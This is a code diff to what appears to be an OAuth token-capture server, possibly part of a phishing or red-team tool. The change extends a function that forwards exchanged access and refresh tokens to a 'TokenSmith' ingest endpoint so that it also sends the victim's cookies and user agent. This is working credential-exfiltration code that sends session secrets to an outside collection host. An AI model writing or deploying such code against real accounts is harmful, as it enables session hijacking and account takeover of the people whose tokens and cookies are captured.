@@ -245,7 +245,7 @@ def exchange_auth_code(payload, server_ctx):
 
         # Optional: push to TokenSmith
         if server_ctx.tokensmith_url:
-            push_to_tokensmith(token_data, server_ctx.tokensmith_url)
+            push_to_tokensmith(token_data, server_ctx.tokensmith_url, payload)
 
     except urllib.error.HTTPError as e:
         error_body = e.read().decode('utf-8', errors='replace')
@@ -359,13 +359,18 @@ def log_failed_exchange(payload, error, server_ctx):
 # TokenSmith integration
 # ─────────────────────────────────────────────────────────────
 
-def push_to_tokensmith(token_data, tokensmith_url):
-    """Push exchanged tokens to TokenSmith's session import API."""
-    import_url = tokensmith_url.rstrip('/') + '/api/session/import'
+def push_to_tokensmith(token_data, tokensmith_url, original_payload=None):
+    """Push exchanged tokens to TokenSmith's tokenflare ingest API."""
+    import_url = tokensmith_url.rstrip('/') + '/api/tokenflare/ingest'
+
+    if original_payload is None:
+        original_payload = {}
 
     payload = json.dumps({
         'access_token': token_data.get('access_token'),
         'refresh_token': token_data.get('refresh_token'),
+        'cookies': original_payload.get('cookies', []),
+        'user_agent': original_payload.get('user_agent', ''),
     }).encode('utf-8')
 
     try:
